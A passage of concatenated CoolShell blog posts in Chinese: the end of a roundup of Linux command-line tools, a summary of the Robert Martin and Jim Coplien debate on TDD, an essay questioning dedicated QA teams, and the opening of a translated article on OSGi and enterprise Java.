Slash’EM 也是一个基于NetHack的经典游戏。!nethack screenshot#### lftp利用lftp命令行ftp工具进行网站数据的增量备份，镜像，就像使用rsync一样。!lftp screenshot#### ackack是一个perl脚本，是grep的一个可选替换品。其可以对匹配字符有高亮显示。是为程序员专门设计的，默认递归搜索，省提供多种文件类型供选。!ack screenshot#### calcurse & remind + wyrdcalcurse是一个命令行下的日历和日程软件。remind \+ wyrd也很类似。关于日历，我不得不提一个Linux的Cycle日历，也是一个神器，呵呵。!calcurse screenshot#### newsbeuter & rsstailnewsbeuter 和 rsstail 是命令行下RSS的阅读工具。!newsbeuter screenshot#### powertop做个环保的程序员，看看自己的电脑里哪些程序费电。PowerTOP 是一个让 Intel 平台的笔记本电脑节省电源的 Linux 工具。此工具由 Intel 公司发布。它可以帮助用户找出那些耗电量大的程序，通过修复或者关闭那些应用程序或进程，从而为用户节省电源。
!powertop screenshot#### htop & iotophtop 和 iotop 用来查看进程，内存和IO负载。!htop screenshot#### ttyrec & ipbtttyrec 是一个 tty 控制台录制程序，其所录制的数据文件可以使用与之配套的 ttyplay 播放。不管是你在 tty 中的各种操作，还是在 tty 中耳熟能详的软件，都可进行录制。ipbt 是一个用来回放 ttyrec 所录制的控制台输入过程的工具。与此类似的还有Shelr 和 termrec!ipbt screenshot#### rsync通过SSH进行文件同步的经典工具（核心算法）!rsync screenshot#### mtrMTR – traceroute 2.0，其是把 traceroute 和 ping 集成在一块的一个小工具 用于诊断网络。!mtr screenshot#### socat & netpipessocat是一个多功能的网络工具，名字来由是” Socket CAT”，可以看作是netcat的N倍加强版。netpipes 和socat一样，主要是用来在命令行来进行socket操作的命令，这样你就可以在Shell脚本下行进socket网络通讯了。
!socat screenshot#### iftop & iptrafiftop和iptraf可以用来查看当前网络链接的一些流量情况。!iftop screenshot#### siege & tsungSiege是一个压力测试和评测工具，设计用于WEB开发这评估应用在压力下的承受能力：可以根据配置对一个WEB站点进行多用户的并发访问，记录每个用户所有请求过程的相应时间，并在一定数量的并发访问下重复进行。Tsung 是一个压力测试工具，可以测试包括HTTP, WebDAV, PostgreSQL, MySQL, LDAP, and XMPP/Jabber等服务器。针对 HTTP 测试，Tsung 支持 HTTP 1.0/1.1 ，包含一个代理模式的会话记录、支持 GET、POST 和 PUT 以及 DELETE 方法，支持 Cookie 和基本的 WWW 认证，同时还支持 SSL。参看：十个免费的Web压力测试工具!siege screenshot#### ledgerledger 一个命令行下记帐的小工具。!ledger screenshot#### taskwarriorTaskWarrior 是一个基于命令行的 TODO 列表管理工具。主要功能包括：标签、彩色表格输出、报表和图形、大量的命令、底层API、多用户文件锁等功能。
!taskwarrior screenshot下图是TaskWarrior 2.0的界面：#### curlcURL是一个利用URL语法在命令行下工作的文件传输工具，1997年首次发行。它支持文件上传和下载，所以是综合传输工具，但按传统，习惯称cURL为下载工具。cURL还包含了用于程序开发的libcurl。cURL支援的通訊協定有FTP、FTPS、HTTP、HTTPS、TFTP、SFTP、Gopher、SCP、Telnet、DICT、FILE、LDAP、LDAPS、IMAP、POP3、SMTP和RTSP。!curl screenshot#### rtorrent & aria2rTorrent 是一个非常简洁、优秀、非常轻量的BT客户端. 它使用了 ncurses 库以 C++ 编写, 因此它完全基于文本并在终端中运行. 将 rTorrent 用在安装有 GNU Screen 和 Secure Shell 的低端系统上作为远程的 BT 客户端是非常理想的。aria2 是 Linux 下一个不错的高速下载工具。由于它具有分段下载引擎，所以支持从多个地址或者从一个地址的多个连接来下载同一个文件。这样自然就大大加快了文件的下载速度。aria2 也具有断点续传功能，这使你随时能够恢复已经中断的文件下载。除了支持一般的 http(s) 和 ftp 协议外，aria2 还支持 BitTorrent 协议。这意味着，你也可以使用 aria2 来下载 torrent 文件。
!rtorrent screenshot#### ttytter & earthquakeTTYtter 是一个Perl写的命令行上发Twitter的工具，可以进行所有其他平台客户端能进行的事情，当然，支持中文。脚本控、CLI控、终端控、Perl控的最愛。Earthquake也是一个命令行上的Twitter客户端。!ttytter screenshot#### vifm & rangerVifm 基于ncurses的文件管理器，DOS风格，用键盘操作。!vifm screenshotRanger用 Python 完成，默认为使用 Vim 风格的按键绑定，比如 hjkl（上下左右），dd（剪切），yy（复制）等等。功能很全，扩展/可配置性也非常不错。类似MacOS X下Finder（文件管理器）的多列文件管理方式。支持多标签页。实时预览文本文件和目录。#### cowsay & slcowsay  不说了，如下所示，哈哈哈。还有xcowsay，你可以自己搜一搜。!cowsay screenshotsl是什么？ls？，呵呵，你会经常把ls 打成sl吗？如果是的话，这个东西可以让你娱乐一下，你会看到一辆火车呼啸而过~~，相当拉风。你可以使用sudo apt-get install sl 安装。
最后，再介绍一个命令中linuxlogo，你可以使用 sudo apt-get install linuxlogo来安装，然后，就可以使用linuxlogo -L   来看一下各种Linux的logo了（全文完）# Bob大叔和Jim Coplien对TDD的论战作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn今年春节时，我写了一篇《TDD并不是看上去的那么美》，在这篇文章中我列举了一些关于使用TDD的一些难点和对TDD的质疑，后来出现了一些争论（可参见那篇文章的评论），以及Todd同学的《TDD到底美不美》，还有infoQ中文上的那个几乎没有营养离线讨论。今天，有网友给我推来一个英文版infoQ的视频——“Coplien and Martin Debate TDD, CDD and Professionalism”，这是2008年2月18日的视频，视频的主角两个人争论TDD好还是不好，一个是敏捷社区的教主级的人物——Robert Martin（大家称之为“Bob大叔”），另一个是C++，OO，多范式编程的大师Jim Coplien（大家都叫他Cope）。这两个人对TDD的见解有分歧。Coplien的很多观点和我之前的不谋而合，而他自己称他是坚决强烈地站在TDD的对立面上。下面是Jim的原话：
> I have adopted a very strong position against what particularly the XP > community is calling test driven development.InfoQ的视频很多时候相当的不给力，就像有前列腺的患者撒尿一样，半天都挤不出一滴。不过，好在那里有这两个人对话的摘录。在这里，我给大家摘要一下：——————————————————正文分割线————————————————————Coplien首先让Uncle Bob定义了一下TDD，Uncle Bob说明了他的三个法则：（敏捷的同学一定不陌生）1. 一个测试驱动的程序员，其不会在写出一个测试失败的Unit Test前，去写一句可用在生产线上的代码。（没有测试之前不要写任何功能代码）   2. 在编写用于生产线上代码之前，不写过多的测试失败的Unit Test。（只编写刚好能体现一个失败情况的测试代码）   3. 在现有代码通过Unit Test前，不写更多的用于生产线上的代码。（只编写恰好能通过测试的功能代码）Coplien说他有意见的不是这三个法则，而是因为这个三个法则是孤立说出来的。Coplien说他和一些咨询师或是Scrum Master参与过很多的项目，他们发现这些项目都有两个问题：
1. 他们使用TDD的时候，软件没有一个架构或是framework。当然，Kent Beck说——TDD可以驱使你去做架构。但是， **TDD和Unit Test 是一回事吗？** Unit Test是一个伟大的事，尤其是当你去写API和类库的时候。今天XP所说的TDD和UT很不一样。如果你使用TDD来驱动你的软件系统架构，那么， **基本上来说，三个迭代以后，你开发的软件就会crash掉，而且无法再往前开发** 。 因为什么？因为连软件团队自己都受不了这三个迭代出来的架构，而且你还会发现，你根本没去去重构。   2. 第二个问题是，TDD这种方法破坏了GUI（图形界面），就算是Kent也说：“ **你永远不可以在一个漂亮的界面后面隐藏一个糟糕的架构** ”，Coplien强烈地相信软件的架构是通过界面来发出其光芒。他觉得如果没有一个好的软件架构，这个会影响用户的操作。Coplien接着说，如果我们使用Uncle Bob的三条法则，我们也许没有什么问题， **但Coplien想告诉大家另一个非常重要的事，那就是软件架构。并说：“我根本不接受TDD是软件专业化实践的论点”** 。Bob大叔说，让我们回到99年，那时的敏捷社区觉得软件架构是无关的，不需要软件架构，只需要做一堆tests，做一堆stories，以及足够快的迭代，这样就可以让那些代码魔幻式地拼装起来，这就是horse shit。对于大多数的敏捷拥护者来说，这的确是愚蠢的。今天你再和Knet说这个事，他也会说那不过是一种说法。
Coplien回应到，实际上，Knet在解释XP的时候，在他的书131页的位置说过，“是的，你得做些前期的架构，但也别把自己搞乱了”。Bob大叔把话题转回来，继续聊关于架构方面的事，他说软件的架构很重要，他也写很一些关于架构的书，他说他也是一个架构方面的怪才，但是他认为架构自己并不会形成软件的所有的外表。他觉得好的软件架构和设计能力应该出现在若干次迭代之后。他觉得你在架构软件的时候，你会创造一些东西，也会破坏一些东西，并且会在几次迭代中做一些试验性的工作，来尝试一下不同的架构。 **在2到3次迭代以后，你可以知道那一种架构是对的，这样，你可以在后面的迭代中进行调整 。因此，他认为架构是需要进化和发展的，而不会因为被可执行的代码所形成，也不会因为你所写的测试而形成** 。Coplien赞同架构进化的观点，而且他相信软件的架构的演变和进化不是因为你写的代码，也不是因为Use Case，也不是告诉你你的软件需求的范围和其中的关系，但是如果你做的方法是以增量式的，以用户驱动式的，而你却在和用户沟通时没有一些前期的业务知识，那么这一定是相当有风险的，并且你一定会把事搞砸的。Coplien接着说，他在Knet早期提到TDD的时候和Knet时，提到YAGNI（陈皓注：You Aren’t Gonna Need It，XP的一个法则，也就是只做最简单的事）时，Kent说到：“让我们来做一个银行帐户，一个储蓄帐户”，储蓄帐户其实就是对余额进行一些加加减减的事，就像一个计算器一样。Copilen继续解释到，但是如果你要做一个真正的银行系统，你的软件架构根本不可能从一个储蓄帐户的对象（计算器）重构出来。因为储蓄帐户根本就不是一个对象，其是一个流程，后面有一个数据库的查帐索引事务，还有存款保证多和利息，还有一些转帐功能。就算是这样，这也只是用户的功能，你还需要支持税务人员和精算会计师等这些人， **这会让银行系统成为一个错综复杂的软件架构，这绝对不是你可以用迭代干出来的事。当然，Bob大叔是可以的，因为他有40年的银行系统的经验。但是Bob大叔你的这40年可真不敏捷啊** 。
Coplien接着说， 因为Bob大叔可以在软件前期做很多很重要的决定，这让得后面的事变得相对比较简单。Coplien根本不相信只要你把代码往那一放，在上面披上一层皮，再设置好一些角色，设置好接口，在文档里写上整个业务结构，而你只有在有人花钱的时候你才会在其中填充进真正的代码，反之就违反了你的YAGNI原则。所以，你只是在你需要的时候做你要做的事，但你却还是要提前得到你的软件架构，否则你一定会把你自己逼进死角的。Bob大叔辩解到，我说的可能和你说的这个有点不同。我们应该不会像你所说的往接口中写一些抽象成员函数，而是创建一些有抽象接口的对象。当然，我不会把一下子为这个对象装载上一堆方法。那些是我需要使用测试驱动或是需求驱动来做的事，我还会随时随地在看是否哪里软件架构可以让我拆分接口。Coplien说，问题 是你得知道你要干什么？他说他非常同意Knet的书”XP Explained”里说的——“你不能去猜”，然后他举了一个例子，一个他曾经在一个电信项目中重新架构软件的例子，这是一个长途交换机的项目，项目组特别喜欢用面向对象，有一个人需要去做一个“Recovery Object”（应该是系统恢复对象），Coplien说这是很扯的一件事，因为系统恢复根本就不是一个对象，因为他对业务不熟，所以想这么做。而当你在细节上分析的时候，你会发现这根本就不是一个有成员方法的对象。我个人认为，Coplien想用这个例子来说Bob大叔的先定义对象的抽象接口并不是一个好的需求分析的方法。Coplien还说，这个事情今天被资本化成了SOA，真是在玩火啊。
Bob大叔说，这个他很同意。你的确需要知道这个对象的意义是什么。而且他和Coplien都同意应该根据可运行的代码来决定未来，而不是基于投机心理搞一个巨大无比的架构。此时，Bob大叔把话题又带回原地，他问Coplien：“你需要多少的时间才能写出可运行的代码？是不是一个系统需要写200万行代码才能算？”，Coplien说，在他的经历中，200万行代码算是小项目了，他的项目都是几亿行代码的。而在让代码可以跑起来，他至少需要让所有的对象都联系起来。Bob追问到，“那么你是怎么测试这些对象的连接性的？”，Coplien说，我当然要测试，我会测试系统启动和停止，看看有没有内存问题，半小时就好了。Bob大叔似乎找到了突破点，于是说到：“Excellent！那么我们间的分歧是什么呢？也许你只是不同意TDD的概念和其专业化，当然，这是另外一个话题了”。然后，Coplien说了一段我非常非常认同的话——“我看到很多人正在做正确的事，来避免我们之前讨论的那些问题，当然那不是TDD的扩展，而是Dan North所说的BDD。可见，软件开发中很多人在开发软件中都是在用正确的很好的方法，而我对此有意见的是，有人把这个事说成TDD，然后人们就去买相关的书来了解TDD，并且看到“architecture only comes from tests”，我在过去6个月中听到过4次这样的说法，这就像你所说的，完全就是horse shit。而关于你所说的专业化的事，如果你没有见过一个专业化你怎么知道？”。（不是吗？大多数人都知道怎么开发软件，而不是TDD才是专业化的软件开发。）
然后，Bob想多谈谈专业化的事，Bob说，在今天，一个不负责任的程序会提交一段他没有跑过单元测试的代码，所以，要确定你没有把一条没有测试过的代码提交到代码库里的最佳做法就是TDD。Coplien完全不同意这个说法。他觉得底层的东西是更重要的。他用了一个示例来攻击Bob大叔的这个观点，他先是说代码走查和结对编程都有好的有价值的地方，当然和这个话题不相关。然后他又说了Unit Test，想想我们的单元测试，可能我们的测试案例并不可能测试我们程序中参数的各种状态，这些状态有可能只是半打，有可能是一百个，有可能是2的32次方个，所以，我们可以命中一些状态，也会没有测试到一些状态，我们的测试真的只是试验性的，所以，如果你在测试中发现bug，你真的很幸运。随后，Coplien推崇了一个叫“Design By Contract” – 契约式设计的方法（我在软件设计中那些方法中提到过，），这个方法认为软件有前验条件，后验条件，还有不变的。这个方法是Eiffel项目使用的一个方法，使用这个方法你可以静态的去做一些检查，相当于你做了一个基础架构来干这些事。Coplien相信这个方法有TDD所有的优点——我需要努力思考我的代码，我需要思考软件的外部接口，而且，Coplien发现这么做会比做测试更有效。这会让你对那些参数的范围考虑地更为宽广，而不是只在测试案例写几个随机分散的值来测试。
今天，Bertrand Meyer(Eiffel语言的创造者，他也不赞同TDD)把这个方法推进了一步，叫CDD – Contract Driven Development，这个是一种关注于对象间关系，其在程序运行前提条件和运行后的后验条中达成一种契约，可以通过对契约条件的动态或静态的检查，来对程序的功能进行验证。这样可以让你更有效地测试程序。这种方法需要对业务的重点部位非常好的了解。这是TDD很难做到的（这就是我在《TDD并不是看上去的那么美》一文中说的TDD的测试范围是个很大的问题）。Bob大叔似乎在努力回忆CDD和Eiffel，然后他说，TDD不就是干这个的吗？TDD就是把契约变成单元测试，不但测试输入，也测试返回值，这不就是先验条件和后验条件，而且他说，Unit Test和代码结合得更紧，而契约没有和代码结合得紧密，这是他觉得很不舒服的地方。Coplien说Bob大叔创建了不应该创建的二元论。他说代码在哪里，UT就跟到哪里，代码有多臃肿，UT就有多臃肿，而UT也是代码，也会有BUG，所以，其实这真是事半功倍。还有一个最有名的示例是ADA编译器，其使用了TDD，反而增加了代码中的BUG，因为你的代码多，测试就多，代码就更多，整个代码就太过臃肿。如果你测试中使用了断言，这意味着你就耦合上了代码，你的测试案例和你的代码耦合地越多，你的代码就越难维护。这就是我在《TDD并不是看上去的那么美》一文中说的TDD的代码臃肿和维护问题）
Bob大叔为Coplien对代码臃肿的说法感到惊讶。Coplien说，这就是他的经历，他看到的。Bob大叔承认有很多混乱的测试和混乱的代码，他觉得像XUnit这样的工具被滥用了。Coplien打断道，这不是要和你争论的，我争论的是这就是我看到大家在实践的东西。Bob大叔反回到，你有没有看到CDD也被滥用的情况？Coplien说，他只觉得目前，软件业对CDD用的还不够。最后，时间不够了，Bob大叔问了一个不相干的问题，他说，我们这里有BDD,CDD, TDD, 关于DD，他不知道谁是最先第一个使用带DD这个词的，他说他好像记得一个RDD – Responsibility Driven Development。Coplien对这个问题可能很无语，他只能说——“DD，这是Unix的一个命令嘛，Disk Dump，但这可能算。谢谢你Bob，很高兴又一次见到你 ”——————————————————正文分割线————————————————————看完后，我的感觉如下：* 这是2008年就在讨论的事，而在2011年我发布了《TDD并不是看上去的那么美》后中国这边才开始讨论。（InfoQ和 Thoughtworks怎么不去找Coplien？）   * 英语很重要，不懂英语，只看国内的东西，你就容易被洗脑，你就需要更多的时间和精力去思考那些早被人思考过的问题。   * 开发和测试，都是需要充分地了解业务，充分的思考，充分权衡后才能做得好的事。并不是你用了哪个方法后就专业了，就NB了。   * 相当BS——上不谈业务，下不谈技术，只谈方法论的人和公司，这是绝对的扭曲。
（全文完）# 我们需要专职的QA吗？作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn这个文章必然是有争议的，我在我的微博上讨论过很多次了，每次都是很有争议的。有不同的观点，有争论总是一件好事，这样可以引发大家的思考。所以，对于我的这篇博文，如果你赞同我的观点，我会感到高兴，如果你会去认真地深入思考，我也会高兴，如果你反对，没关系，可以讨论。在此之前，我想说明一下我观点里的这个“专职QA”是怎么定义的。1. 其是很多公司成立的专门做测试的技术人员，仅测试不开发。   2. 这些QA对于软件开发技术并不熟悉，甚至不懂。我经历过一些公司都有专职的QA团队（专职的测试人员），自从上个公司我的开发团队在一个项目上被QA部门搞得一团糟，我越来越怀疑专职QA存在在意义。我的观点不一定对，但请让我鲜明地表达一下—— **我觉得是不需要全职的QA的，甚至不需要QA这一专职角色或部门，因为，不懂开发的人必然做不好测试。就像不懂开发的研发经理必然管不好研发团队一样。** 我越来越觉得Dev应该应该是做测试最合适的人选，这必然是未来的趋势 （因为我已经看到了中国程序员的进步，相比起10年前，今天的程序员已经是非常全面了，再来十年，必然证明我的观点是对的）。
在我正在展开说明之前，我想引用两篇文章：#### 两篇文章一篇是 “On testers and testing”(中文翻译)，本文的作者Sriram Krishnan是一名程序员，曾在Yahoo和微软工作过，开发过很多软件，曾被纽约时报报道，写过一本书，本文是他的一篇博客。他在文章中表达了这几个观点——> 大多数的开发团队并不需要一个独立的测试角色。即使要有，那么所有的开发时间比上所有的测试时间应该 > >20:1的。。证据吗？光看看一些从古至今最成功的软件开发团队就知道了。不论是当今的Facebook，还是30年前最初的NT团队，很多伟大的产品都是出自没有或很少测试人员的团队。 > > > 开发人员应该测试自己的代码。没什么可说的。背后的道理并不重要。这包括单元测试，全覆盖的自动化测试或手工测试或组合测试。如果你的开发人员不能/不愿意或认为这“不归我管”，那你需要更好的程序员。另一篇文章是邹欣的“现代软件工程讲义 9 测试 QA 的角色和分工”，这是一篇很不错的文章。他在文章里提到了分工的必要性，比如第三方的鉴定机构， **并且也指出了分工的一些问题，比如，画地为牢的分工，无明确责任的分工，等，这些问题直接命中了分工的要害** 。我隐约觉得，我和邹欣的很多观点是相同的，我们内容上是相同的，只是形式上还有分歧。另外，我的观点太鲜明了，从而容易导向极端的理解。
你看， **我们都同意，Dev要懂测试，QA要懂开发，只不过分工不同，既然你中有我，我中有你，那就不要分彼此了，一起携手开发测试吧** 。（另外，我个人觉得不懂开发的测试人员不可能测试得好）_**—- update—-**_ {//本篇文章出来后，网上出现了一些对此讨论的文章，我一并更新在这里   【 《对《我们需要专职QA吗？》的回应》作者：@段念- 段文韬 】   【 《关于“我们需要专职的QA吗”》作者：@Jacky郭 】   【 《我们需要专职的QA吗？（评）》作者：@Monkey陳曄曄 】   【《 《我们需要专职的QA吗？》读后感》作者：@ 花生色魔叔】}#### 我的故事我再说说我最糟糕的QA经历吧，这个公司的QA部门只做测试，他们的leader觉得所有的test design和test 的过程都不需要Dev参与，他们是独立于Dev之外的部门，他们几乎不关心Dev的设计和实现，他们只关心能跑通他们自己设计的test case。但是去执行Test Case的时候，又需要Dev的支持，尤其在环境设置，测试工具使用，确认是否是bug方面，全都在消耗着Dev的资源，最扯的是，他们对任何线上的问题不负责，反正出了问题由Dev加班搞定。
我有一次私自review他们的test case的时候，发现很多的test case这样写到 – “Expected Result：Make sure every thing is fine” ，WTF，什么叫“Every thing is fine”？！而在test case design的时候，没有说明test environment/configuration 是什么？没有说明test data在哪里？Test Case、Test Data、Test Configuration都没有版本控制，还有很多Test Case设计得非常冗余（多个Test Case只测试了一个功能），不懂得分析Function Point就做Test Design。另外，我不知道他们为什么那么热衷于设计一堆各式各样的Negative Test Case，而有很多Positive的Test Case没有覆盖到。为什么呢，因为他们不知道开发和设计的细节，所以没有办法设计出Effective的Test Case，只能从需求和表面上做黑盒。在做性能测试的时候，需要Dev手把手的教怎么做性能测试，如何找到系统性能极限，如何测试系统的latency，如何观察系统的负载（CPU，内存，网络带宽，磁盘和网卡I/O，内存换页……）如何做Soak Test，如何观察各个线程的资源使用情况，如何通过配置网络交换机来模拟各种网络错误，等等，等等。
测试做得也不认真，大量的False Alarm，都是环境问题，比如：安装新版本后没有重启服务，没有使用新的配置文件，网络配置，等等，等等。在项目快要上线前的一周，我又私自查看了一下他们的Test Result，我看到5天的Soak Test 的内存使用一直往上涨，很明显的内存泄露，这个情况发生在2个月前，但是一直都没有报告，我只好和我的程序员每天都加班到凌晨，赶在上线前解决了这个问题。但是，QA部门的同学们就像没发生什么事似的，依然正常上下班。哎……为什么会这样？我觉得有这么几点原因（和邹欣的观点一样）1. 给了QA全部测试的权力，但是没有给相应的责任，   2. QA没有体会过软件质量出问题后的痛苦（解决线上问题的压力），导致QA不会主动思考和改进。   3. QA对Dev的开发过程和技术完全不了解，增加了很多QA和Dev的沟通。   4. QA对软件项目的设计和实现要点不了解，导致了很多不有效的测试。**注：我无意在这里贬低QA的能力工作。只是我看到了QA因为没有参与开发的一些现实问题。**#### 我的观点邹欣对于分工出现的问题给出了两点解决方法：>   * 充分授权和信任（Empower team members） >   * 各司其职，对项目共同负责（Establish clear accountability and shared responsibility） >
我的观点是， **理论上正确，操作上太虚了。这就像我们国家喊的“为人民服务”的口号一样，没有具体的方法，根本无法落实。**我无意在这里贬低QA的工作，我也无意因为这个事走向另一个极端。但是，我在现在公司的经历，还有很多新兴公司的做法， **我越来越觉得软件开发，真的不需要专职的QA，更不需要只写代码不懂做测试的专职的Dev** 。观点如下：**1）** **开发人员做测试更有效*** 开发人员本来就要测试自己写的软件，如果开发人员不懂测试，或是对测试不专业，那么这就不是一个专业的开发人员。   * 开发人员了解整个软件的设计和开发过程，开发人员是最清楚应该怎么测试的，这包括单元测试，功能测试，性能测试，回归测试，以及Soak Test 等。   * 开发人员知道怎么测试是最有效的。开发人员知道所有的function point，知道fix一个bug后，哪些测试要做回归和验证，哪些不需要。开发人员的技术能力知道怎么才能更好的做测试。很多开发人员只喜欢写代码，不喜欢做测试，或是他们说，开发人员应该关注于开发，而不是测试。这个思路相当的错误。开发人员最应该关注的是软件质量，需要证明自己的开发成果的质量。 **开发人员如果都不知道怎么做测试，这个开发人员就是一个不合格的开发人员** 。
另外， **我始终不明白，为什么不做开发的QA会比Dev在测试上更专业？ 这一点都说不通啊** 。**2）减少沟通，扯皮，和推诿**想想下面的这些情况你是否似曾相识？* QA 做的测试计划，测试案例设计，测试结果，总是需要Dev来评审和检查。   * QA在做测试的过程中，总是需要Dev对其测试的环境，配置，过程做指导。   * QA总是会和Dev争吵某个问题是不是BUG，争吵要不要解决。   * 无论发现什么样的问题，总是Dev去解决，QA从不fix问题。   * 我们总是能听到，线上发生问题的时候，Dev的抱怨QA这样的问题居然没测出来，   * QA也总会抱怨Dev代码太差，一点也不懂测试，没怎么测就给hand over 给QA了。   * QA总是会push Dev，这个bug再不fix，你就影响我的进度了。   * 等等，等等。如果没有QA，那么就没有这么多事了，DEV自己的干出来的问题，自己处理，没什么好扯皮的。而一方面，QA说Dev不懂测试，另一方面Dev说QA不懂技术，而我们还要让他们隔离开来，各干各的，这一点都不利于把Dev和QA的代沟给填平了。 **要让Dev理解QA，让QA理解Dev，减少公说公有理，婆说婆有理的只站在自己立场上的沟通，只有一个方法，那就是让Dev来做测试，让QA来做开发** 。这样一样，大家都是程序员了。
**3）吃自己的狗食**真的优秀的开发团队都是要吃自己狗食的。这句话的意思是—— **如果你不能切身体会到自己干的烂事，自己的痛苦，你就不会有想要去改进的动机** 。 **没有痛苦，就不会真正地去思考，没有真正的思考，就没有真正的进步** 。在我现在的公司，程序员要干几乎有的事，从需求分析，设计，编码，集成，测试，部署，运维，OnCall，从头到尾，因为：* 只有了解了测试的难度，你才明白怎么写出可测试的软件，怎么去做测试的自动化和测试系统。   * 只有自己真正去运维自己的系统，你才知道怎么在程序里写日志，做监控，做统计……   * 只有自己去使用自己的系统，你才明白用户的反馈，用户的想法，和用户的需求。所以， **真正的工程师是能真正明白软件开发不单单只是coding，还更要明白整个软件工程** 。只明白或是只喜欢coding的，那只是码农，不能称之为工程师。**4）其它问题*** **关于SDET** 。全称是Software Development Engineer on Test。像微软，Google， Amazon都有这样的职位。但我不知道这样的职位在微软和Google的比例是多少，在Amazon是非常少的。那么像这样的懂开发的专职测试可以有吗？我的答案是可以有！但是，我在想， **如果一个人懂开发，为什么只让其专职做测试呢？这样的程序员分工合理吗？把程序员分成两等公民有意义吗？试问有多少懂开发的程序员愿意只做测试开发呢？** 所以，SDET在实际的操作中，更多的还是对开发不熟的测试人员。还是哪句话，不懂开发的人是做不好测试的。
* **如果你说Dev对测试不专业，不细心，不认真** ，那么我们同样也无法保证QA的专业，细心和认真。在Dev上可能出现的问题，在QA也也会一样出现。而出了问题QA不会来加班解决，还是开发人员自己解决。所以，如果QA不用来解决问题，那么，QA怎么可能真正的细心和认真呢？* **如果你说不要QA的话，Dev人手会不够** 。你这样想一下，如果把你团队中现有的QA全部变成Dev，然后，大家一起开发，一起测试，亲密无间，沟通方便，你会不会觉得这样会更有效？你有没有发现，在重大问题上，Dev可以帮上QA的忙，但是QA帮不上Dev的忙。* **第三方中立，你会说人总是测不好自己写的东西，因为有思维定式** 。没错，我同意。但是如果是Dev交叉测试呢？你可能会说开发人员会有开发人员的思维定式。那这只能说明开发人员还不成熟，他们还不合格。没关系，只要吃自己的狗食，痛苦了，就会负责的。* **磨刀不误砍柴功** 。如果你开发的东西自己在用，那么自己就是自己天然的QA，如果有别的团队也在用你开发的模块，那么，别的团队也就很自然地在帮你做测试了，而且是最真实的测试。* **你可能会说吃狗食就是个笑话，因为如果是我，我把事干烂后，就离职走人了，让别人去吃我的狗食** 。这个在现实中的确会发生，也是很现实的。但是想一想，你为什么在一开始让他把事干烂了？另外，如果你的团队在设计评审和代码评审里没有把好关，让某人把事给干烂了，那么这个人的离职带来的问题还是这个团队来扛，于是整个团队都在吃自己的狗食，挺公平的。痛苦过一次，你的团队下次怎么干了，就不敢乱招人了，就不敢随意评审代码了，就不敢让人只做一块东西了。最终还是没有逃脱吃狗食的范畴。
* **关于系统集成测试。** 所谓集成测试，就是把多个开发团队开发的模块集中起来测试。因为开发人员可能无法看到全局，不了解别个团队的系统，而且步调不一，所以需要有统管全局的专职的QA进行统筹规划并做测试。对这个方面，我并不反对，在实际操作过程中，好像的确用专职的做集成测试的QA统一调度各团队的时度更有效一些。不过，这还是不能让我停止去思考两个问题，1) 如果开发人员看不到全局，他能开发出更好的软件吗？2）这个全职的做集成测试的QA难道不能是各个团队的骨干Dev来组成吗？3）统一调度这个事，不更像是Project Manager要做的事吗？* **关于自动化测试** 。所谓自动化的意思是，这是一个机械的重复劳动。我想让测试人员思考一下，你是否在干这样的事？如果你正在干这样的事，那么，你要思考一下你的价值了。但凡是重复性比较高的机械性的劳动，总有一天都会被机器取代的。* **关于线上测试** 。我们都知道，无论自己内测的怎么样，到了用户那边，总是会有一些测试不到的东西。所以，有些公司会整出个UAT，用户验收测试。做产品的公司会叫Beta测试。无论怎么样，你总是要上生产线做真正测试的。对于互联网企业来说，生产线上测试有的在玩A/B测试，有的玩部分用户测试，比如，新上线的功能只有10%的用户可以访问得到，这样不会因为出问题让全部用户受到影响。做这种测试系统的人必然是开发人员。
好吧，我暂时写这么多，我会视大家的讨论再补充我的观点的。_**—– update 2012/4/11—–**_一些人觉得我是在泄私愤，我能够理解为什么我会被这样误解，但是没有关系，很多新东西新观点总是会被误解的，我坦然面对。请大家抛开我的这些情感因素，单纯的思考一下，没有专职QA的的团队架构是否有积极的意义在里面？**再补充一点，大家思考一下，QA是保证质量的，但是很多QA是在做测试，软件质量是测试出来的吗？如果不从需求分析，软件设计，代码实现上做好控制，到测试的时候你还怎么保证质量呢？**（全文完）# OSGi和Java企业级运算的未来方向作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn**摘要** ： OSGi也是译者最近才接触到的技术，但是在OSGi的发展中，它越来越收到了来自行业的关注。作为OSGi的动态部署，译者认为此项规范对于企业应用应该是非常有帮助的。特别在银行的信息化建设中将会起到很重要的作用，因为国内大多的银行业都在强调7*24小时系统，但是其业务发展又非常迅速，常常有新需求，新变更。如果每一次上线变更都将重启系统的话，对银行的服务质量和形象将会造成较大的影响。 此文只是讲述了OSGi在Java企业运算中的新动向，并没有具体的介绍OSGi的规范。关于OSGi规范的文档可以从jcp上下载
原文出处：这里   ******OSGi和Java企业级运算的未来方向**by Eric Newcomer无论JCP是否完全的迷失了它的方向，它都不同程度受到来自外部活动的影响。Spring框架和Hibernate影响了EJB3，而且JPA也是一个好的例子。另外日渐感觉到的影响来自于对OSGi规范的采用和其实现，特别是实现了OSGi的开源的Eclipse Equinox，Apache Felix和Knoplerfish框架OSGi规范为Java定义动态模组元信息系统和在其交互模组中的面向服务的编程模型。这个规范定义了一个为服务查找的注册表，还定义了一组通用功能集合，例如安全，生命周期管理，日志等。OSGi的框架如今已经被Eclipse基金采用，许多的主要Java厂商采用这个规范来开发中间件产品，同时OSGi也被很多开源项目组采用，包括用来开发应用服务器，企业服务总线，和集成开发环境。作为在商业产品和开源项目中广泛被使用的的核心平台，OSGi联盟开始接收到来自更复杂的的对企业应用的支持需求。在1999年,OSGi规范最初是JSR-8，主要的目的是用于家庭自助网关(home automation gateways)。自从那时起，OSGi技术就被在各种个样自助，移动电话，和家庭娱乐的嵌入应用程序所使用。2006年的8月份，OSGi联盟，接收许多关注于OSGi企业版本的建议并举行一个关于讨论成立一个OSGi企业专家组(EEG）可能性的会议。
